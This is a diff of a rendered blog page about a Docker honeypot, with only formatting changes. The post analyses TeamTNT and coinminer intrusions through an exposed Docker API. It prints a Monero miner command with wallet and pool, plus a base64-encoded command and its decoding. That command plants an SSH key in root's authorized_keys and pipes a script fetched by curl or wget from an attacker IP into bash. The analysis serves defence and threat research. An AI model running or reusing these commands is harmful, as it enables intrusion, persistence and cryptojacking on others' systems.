@@ -11,12 +11,12 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <meta
   name="description"
-  content="Honeypot #  https://sysdig.com/blog/triaging-malicious-docker-container/
+  content="Honeypot # https://sysdig.com/blog/triaging-malicious-docker-container/
 https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/
 https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124
 https://hub.docker.com/_/alpine
 EC2 Instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container.
- Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer.  Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
+Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer. Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
 Activity between 10pm 2/9 and 04:32 2/10"
 />
 <meta
@@ -51,31 +51,29 @@ Activity between 10pm 2/9 and 04:32 2/10"
 <link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
 
 
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Honeypot"/>
-<meta name="twitter:description" content="Honeypot #  https://sysdig.com/blog/triaging-malicious-docker-container/
+<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Honeypot"/>
+<meta name="twitter:description" content="Honeypot # https://sysdig.com/blog/triaging-malicious-docker-container/
 https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/
 https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124
 https://hub.docker.com/_/alpine
 EC2 Instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container.
- Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer.  Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
+Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer. Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
 Activity between 10pm 2/9 and 04:32 2/10"/>
 
 
 
 <meta property="og:title" content="Honeypot" />
-<meta property="og:description" content="Honeypot #  https://sysdig.com/blog/triaging-malicious-docker-container/
+<meta property="og:description" content="Honeypot # https://sysdig.com/blog/triaging-malicious-docker-container/
 https://www.intezer.com/blog/malware-analysis/how-to-make-malware-honeypot/
 https://medium.com/@riccardo.ancarani94/attacking-docker-exposed-api-3e01ffc3c124
 https://hub.docker.com/_/alpine
 EC2 Instance running Ubuntu Server 18.04 w/ Docker running an Alpine Linux container.
- Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer.  Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
+Port 22 is locked to my IP only Port 2375 is exposed which is the Docker API. Useful for tools like Portainer. Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.
 Activity between 10pm 2/9 and 04:32 2/10" />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://axelarator.github.io/posts/honeypot/" /><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2022-06-23T19:50:38-04:00" />
 <meta property="article:modified_time" content="2022-06-23T19:50:38-04:00" /><meta property="og:site_name" content="Axelarator Blog" />
-
 
 
 
@@ -208,11 +206,11 @@ Activity between 10pm 2/9 and 04:32 2/10" />
 <li>Port 2375 is exposed which is the Docker API. Useful for tools like Portainer.</li>
 </ul>
 <p>Got an alert for a masscan command searching for port 2375. Another alert was triggered for 2376 as some APIs expose this instead of 2375.</p>
-<p><img src="/Honeypot/Untitled.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled.png"></p>
 <p>Activity between 10pm 2/9 and 04:32 2/10</p>
-<p><img src="/Honeypot/alerts.jpg" alt="alerts.JPG"></p>
+<p><img alt="alerts.JPG" src="/Honeypot/alerts.jpg"></p>
 <p>I found that one of these alerts dealt with a new docker container “risible_oxter.” More on that later but for context, I only installed an Alpine container. The others weren’t a concern as they immediately exited and eventually removed.</p>
-<p><img src="/Honeypot/Capture.jpg" alt="Capture.JPG"></p>
+<p><img alt="Capture.JPG" src="/Honeypot/Capture.jpg"></p>
 <h3 id="cetus">
   Cetus
   <a href="#cetus" class="h-anchor" aria-hidden="true">#</a>
@@ -222,17 +220,17 @@ Activity between 10pm 2/9 and 04:32 2/10" />
 <p>Execution Time: 10 Feb 22 | 04:24</p>
 <p>SHA256: b49a3f3cb4c70014e2c35c880d47bc475584b87b7dfcfa6d7341d42a16ebe443</p>
 <p>Process Tree:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/sbin/init
-	/usr/bin/containerd-shim-runc-v2 -namespace moby -id 8f01c6e6c82aa76d2eb7a4671bcea039e5a01b89bd0edff8ce1acf3146abd300 -address /run/containerd/containerd.sock
-		/bin/bash
-			/usr/bin/portainer risible_oxter
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/sbin/init
+</span></span><span style="display:flex;"><span>	/usr/bin/containerd-shim-runc-v2 -namespace moby -id 8f01c6e6c82aa76d2eb7a4671bcea039e5a01b89bd0edff8ce1acf3146abd300 -address /run/containerd/containerd.sock
+</span></span><span style="display:flex;"><span>		/bin/bash
+</span></span><span style="display:flex;"><span>			/usr/bin/portainer risible_oxter
+</span></span></code></pre></div><ul>
 <li>Container was executed at 04:18</li>
 <li>Related sample to TeamTNT</li>
 </ul>
 <p>New activity while writing this. Now defining an actual pool address with additional parameters. The utmp.log showed mining activity and hardware info.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">docker-cache -B --donate-level <span style="color:#ae81ff">1</span> -o pool.minexmr.com:443 -u 85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh -k --tls -t <span style="color:#ae81ff">1</span> --rig-id risible_oxter -l /var/log/utmp.log
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker-cache -B --donate-level <span style="color:#ae81ff">1</span> -o pool.minexmr.com:443 -u 85X7JcgPpwQdZXaK2TKJb8baQAXc3zBsnW7JuY7MLi9VYSamf4bFwa7SEAK9Hgp2P53npV19w1zuaK5bft5m2NN71CmNLoh -k --tls -t <span style="color:#ae81ff">1</span> --rig-id risible_oxter -l /var/log/utmp.log
+</span></span></code></pre></div><ul>
 <li>Connects to 94[.]130[.]164[.]163:443</li>
 </ul>
 <h3 id="generic-malware">
@@ -242,19 +240,19 @@ Activity between 10pm 2/9 and 04:32 2/10" />
 <p>Execution Time: 09 Feb 22 | 22:06</p>
 <p>SHA256: 0d95f767c5f828695761e199b6e0b9fe62ace2902221540a33d331859648e761</p>
 <p>Process Tree:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/sbin/init
-	/var/tmp/.copydie/<span style="color:#f92672">[</span>kswapd0<span style="color:#f92672">]</span> --config<span style="color:#f92672">=</span>/var/tmp/.copydie/<span style="color:#f92672">[</span>kswapd0<span style="color:#f92672">]</span>.pid
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/sbin/init
+</span></span><span style="display:flex;"><span>	/var/tmp/.copydie/<span style="color:#f92672">[</span>kswapd0<span style="color:#f92672">]</span> --config<span style="color:#f92672">=</span>/var/tmp/.copydie/<span style="color:#f92672">[</span>kswapd0<span style="color:#f92672">]</span>.pid
+</span></span></code></pre></div><ul>
 <li></li>
 </ul>
-<p><img src="/Honeypot/Untitled%201.png" alt="Malicious file opened. Another Monero coinminer"></p>
+<p><img alt="Malicious file opened. Another Monero coinminer" src="/Honeypot/Untitled%201.png"></p>
 <p>Malicious file opened. Another Monero coinminer</p>
 <p><code>cat</code> output of <code>/var/tmp/.copydie/[kswapd0].pid</code></p>
-<p><img src="/Honeypot/Untitled%202.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled%202.png"></p>
 <ul>
 <li><code>[kswapd0]</code> is a stripped executable so I couldn’t view strings.</li>
 </ul>
-<p><img src="/Honeypot/Untitled%203.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled%203.png"></p>
 <h3 id="tsunami">
   Tsunami
   <a href="#tsunami" class="h-anchor" aria-hidden="true">#</a>
@@ -263,9 +261,9 @@ Activity between 10pm 2/9 and 04:32 2/10" />
 <p>Execution Time: 09 Feb 22 | 22:06</p>
 <p>SHA256: 6574b93062974e287a65798dca6f6efd2bc8f8e376baa6efa69ddfc719acf8d9</p>
 <p>Process Tree:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/sbin/init
-	/bioset
-</code></pre></div><p><img src="/Honeypot/Untitled%204.png" alt="Untitled"></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/sbin/init
+</span></span><span style="display:flex;"><span>	/bioset
+</span></span></code></pre></div><p><img alt="Untitled" src="/Honeypot/Untitled%204.png"></p>
 <p>Turns out it’s a TeamTNT botnet.</p>
 <p><a href="https://www.lacework.com/blog/teamtnt-builds-botnet-from-chinese-cloud-servers/">TeamTNT Builds Botnet from Chinese Cloud Servers - Lacework</a></p>
 <p>Network Connections</p>
@@ -284,28 +282,28 @@ Activity between 10pm 2/9 and 04:32 2/10" />
 </tbody>
 </table>
 <p>Some further attribution tying the Tsunami sample to TeamTNT based on similar strings.</p>
-<p><img src="/Honeypot/Untitled%205.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled%205.png"></p>
 <h3 id="teamtnt">
   TeamTNT
   <a href="#teamtnt" class="h-anchor" aria-hidden="true">#</a>
 </h3>
 <p>TeamTNT first sets up their own ssh key and moves the private key to <code>/tmp/TeamTNT</code></p>
-<p><img src="/Honeypot/Untitled%206.png" alt="Untitled"></p>
-<p><img src="/Honeypot/Untitled%207.png" alt="Untitled"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled%206.png"></p>
+<p><img alt="Untitled" src="/Honeypot/Untitled%207.png"></p>
 <p>Initially uses busybox to launch a base64 encoded command and with that copies their public key to the <code>authorized_keys</code> folder for persistence. With an active connection, I believe this is how the Ziggy Startux botnet gets installed.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/bin/busybox
-
-<span style="color:#e6db74">`</span>chroot /host bash -c echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA<span style="color:#f92672">==</span> | base64 -d | bash<span style="color:#e6db74">`</span>
-</code></pre></div><p>Decoded output</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh-keygen -N <span style="color:#e6db74">&#34;&#34;</span> -f /tmp/TeamTNT
-mkdir -p /root/.ssh
-chattr -R -ia /root/.ssh/ 2&gt;/dev/null; tntrecht -R -ia /root/.ssh/ 2&gt;/dev/null; ichdarf -R -ia /root/.ssh/ 2&gt;/dev/null
-cat /tmp/TeamTNT.pub &gt;&gt; /root/.ssh/authorized_keys
-cat /tmp/TeamTNT.pub &gt; /root/.ssh/authorized_keys2
-rm -f /tmp/TeamTNT.pub
-
-ssh -oStrictHostKeyChecking<span style="color:#f92672">=</span>no -oBatchMode<span style="color:#f92672">=</span>yes -oConnectTimeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> -i /tmp/TeamTNT root@127.0.0.1 <span style="color:#e6db74">&#34;(curl http://104[.]192[.]82[.]138/s3f1015/b/a.sh||cd1 http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wget -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wd1 -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh)|bash&#34;</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/bin/busybox
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>chroot /host bash -c echo c3NoLWtleWdlbiAtTiAiIiAtZiAvdG1wL1RlYW1UTlQKbWtkaXIgLXAgL3Jvb3QvLnNzaApjaGF0dHIgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsOyB0bnRyZWNodCAtUiAtaWEgL3Jvb3QvLnNzaC8gMj4vZGV2L251bGw7IGljaGRhcmYgLVIgLWlhIC9yb290Ly5zc2gvIDI+L2Rldi9udWxsCmNhdCAvdG1wL1RlYW1UTlQucHViID4+IC9yb290Ly5zc2gvYXV0aG9yaXplZF9rZXlzCmNhdCAvdG1wL1RlYW1UTlQucHViID4gL3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMyCnJtIC1mIC90bXAvVGVhbVROVC5wdWIKCgpzc2ggLW9TdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW9CYXRjaE1vZGU9eWVzIC1vQ29ubmVjdFRpbWVvdXQ9NSAtaSAvdG1wL1RlYW1UTlQgcm9vdEAxMjcuMC4wLjEgIihjdXJsIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8Y2QxIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaHx8d2dldCAtcSAtTy0gaHR0cDovLzEwNC4xOTIuODIuMTM4L3MzZjEwMTUvYi9hLnNofHx3ZDEgLXEgLU8tIGh0dHA6Ly8xMDQuMTkyLjgyLjEzOC9zM2YxMDE1L2IvYS5zaCl8YmFzaCIKCnJtIC1mIC90bXAvVGVhbVROVA<span style="color:#f92672">==</span> | base64 -d | bash<span style="color:#e6db74">`</span>
+</span></span></code></pre></div><p>Decoded output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -N <span style="color:#e6db74">&#34;&#34;</span> -f /tmp/TeamTNT
+</span></span><span style="display:flex;"><span>mkdir -p /root/.ssh
+</span></span><span style="display:flex;"><span>chattr -R -ia /root/.ssh/ 2&gt;/dev/null; tntrecht -R -ia /root/.ssh/ 2&gt;/dev/null; ichdarf -R -ia /root/.ssh/ 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>cat /tmp/TeamTNT.pub &gt;&gt; /root/.ssh/authorized_keys
+</span></span><span style="display:flex;"><span>cat /tmp/TeamTNT.pub &gt; /root/.ssh/authorized_keys2
+</span></span><span style="display:flex;"><span>rm -f /tmp/TeamTNT.pub
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ssh -oStrictHostKeyChecking<span style="color:#f92672">=</span>no -oBatchMode<span style="color:#f92672">=</span>yes -oConnectTimeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span> -i /tmp/TeamTNT root@127.0.0.1 <span style="color:#e6db74">&#34;(curl http://104[.]192[.]82[.]138/s3f1015/b/a.sh||cd1 http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wget -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh||wd1 -q -O- http://104[.]192[.]82[.]138/s3f1015/b/a.sh)|bash&#34;</span>
+</span></span></code></pre></div>
     </div>
     
       
